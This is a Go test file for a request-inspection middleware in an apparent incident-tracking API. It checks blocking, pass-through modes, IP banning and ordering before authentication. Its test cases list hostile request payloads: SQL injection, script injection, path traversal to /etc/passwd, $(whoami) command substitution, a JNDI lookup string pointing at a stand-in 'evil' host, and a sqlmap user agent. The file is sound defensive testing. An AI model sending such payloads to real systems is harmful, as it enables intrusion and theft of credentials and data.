package main

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func inspHandler(mode string) (http.Handler, *int) {
	reached := 0
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached++
		w.WriteHeader(http.StatusOK)
	})
	return (&Server{}).inspectRequests(mode, next), &reached
}

func inspSend(h http.Handler, method, target, ua, remote string, body string) int {
	var req *http.Request
	if body != "" {
		req = httptest.NewRequest(method, target, strings.NewReader(body))
	} else {
		req = httptest.NewRequest(method, target, nil)
	}
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if remote != "" {
		req.RemoteAddr = remote
	}
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	return rr.Code
}

func TestInspectBlocksKnownBadPatterns(t *testing.T) {
	bad := []string{
		"/v1/events?q=%27%20OR%20%271%27%3D%271",
		"/v1/events?id=1%20UNION%20SELECT%20password%20FROM%20users",
		"/v1/incidents?x=1%3B%20DROP%20TABLE%20users",
		"/v1/events?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
		"/v1/events?next=javascript:alert(1)",
		"/v1/%2e%2e/%2e%2e/etc/passwd",
		"/v1/events?file=..%2f..%2fetc%2fpasswd",
		"/v1/events?f=%252e%252e%252fsecret",
		"/v1/events?x=%24%28whoami%29",
		"/v1/events?x=%24%7Bjndi:ldap://evil/a%7D",
		"/v1/events?x=%00",
		"/v1/events?x=" + strings.Repeat("a", 3000),
	}
	for _, target := range bad {
		h, reached := inspHandler("block")
		if got := inspSend(h, "GET", target, "", "", ""); got != 403 {
			t.Errorf("%.60s: want 403, got %d", target, got)
		}
		if *reached != 0 {
			t.Errorf("%.60s: a blocked request reached the handler", target)
		}
	}
}

func TestInspectAllowsNormalTraffic(t *testing.T) {
	good := []string{
		"/healthz",
		"/readyz",
		"/v1/incidents?status=open&limit=50&offset=0",
		"/v1/events?kind=auth.failed_login&severity=high",
		"/v1/incidents/3f2c9a10-1111-4222-8333-444455556666",
		"/_next/static/chunks/app-1a2b3c.js",
		"/v1/events?since=2026-11-22T10%3A00%3A00Z",
		"/v1/events?q=select",
		"/v1/events?note=it%27s+fine",
	}
	for _, target := range good {
		h, reached := inspHandler("block")
		if got := inspSend(h, "GET", target, "", "", ""); got != 200 {
			t.Errorf("%s: want 200, got %d", target, got)
		}
		if *reached != 1 {
			t.Errorf("%s: clean request did not reach the handler", target)
		}
	}
}

func TestInspectDoesNotReadBodies(t *testing.T) {
	h, _ := inspHandler("block")
	body := `{"subject":"x","password":"' OR '1'='1"}`
	if got := inspSend(h, "POST", "/v1/auth/login", "", "", body); got != 200 {
		t.Errorf("body content must not be inspected, got %d", got)
	}
}

func TestInspectScannerAgents(t *testing.T) {
	h, _ := inspHandler("block")
	if got := inspSend(h, "GET", "/healthz", "sqlmap/1.7.2#stable", "", ""); got != 403 {
		t.Errorf("sqlmap: want 403, got %d", got)
	}
	for _, ua := range []string{"curl/8.4.0", "Go-http-client/1.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0"} {
		h2, _ := inspHandler("block")
		if got := inspSend(h2, "GET", "/healthz", ua, "", ""); got != 200 {
			t.Errorf("%s: want 200, got %d", ua, got)
		}
	}
}

func TestInspectModes(t *testing.T) {
	bad := "/v1/events?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
	h, reached := inspHandler("monitor")
	if got := inspSend(h, "GET", bad, "", "", ""); got != 200 || *reached != 1 {
		t.Errorf("monitor mode must pass the request through, got %d reached=%d", got, *reached)
	}
	h, reached = inspHandler("off")
	if got := inspSend(h, "GET", bad, "", "", ""); got != 200 || *reached != 1 {
		t.Errorf("off mode must pass the request through, got %d reached=%d", got, *reached)
	}
}

func TestInspectBansRepeatOffenderButNotLoopback(t *testing.T) {
	bad := "/v1/events?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
	h, _ := inspHandler("block")
	for i := 0; i < banAfter; i++ {
		if got := inspSend(h, "GET", bad, "", "203.0.113.9:4444", ""); got != 403 {
			t.Fatalf("bad request %d: want 403, got %d", i, got)
		}
	}
	if got := inspSend(h, "GET", "/healthz", "", "203.0.113.9:4444", ""); got != 403 {
		t.Errorf("a banned IP must be refused even for clean requests, got %d", got)
	}
	if got := inspSend(h, "GET", "/healthz", "", "203.0.113.10:4444", ""); got != 200 {
		t.Errorf("a different IP must not be affected, got %d", got)
	}

	h2, _ := inspHandler("block")
	for i := 0; i < banAfter+5; i++ {
		if got := inspSend(h2, "GET", bad, "", "127.0.0.1:5000", ""); got != 403 {
			t.Fatalf("loopback bad request %d: want 403, got %d", i, got)
		}
	}
	if got := inspSend(h2, "GET", "/healthz", "", "127.0.0.1:5000", ""); got != 200 {
		t.Errorf("a loopback peer must never be banned, got %d", got)
	}
}

func TestInspectRunsBeforeAuthentication(t *testing.T) {
	s := testServer()
	h := s.inspectRequests("block", s.routes())
	if got := inspSend(h, "GET", "/v1/me?x=%27%20OR%20%271%27%3D%271", "", "", ""); got != 403 {
		t.Errorf("an attack must be stopped before auth: want 403, got %d", got)
	}
	if got := inspSend(h, "GET", "/v1/me", "", "", ""); got != 401 {
		t.Errorf("a clean anonymous request must still get 401, got %d", got)
	}
}
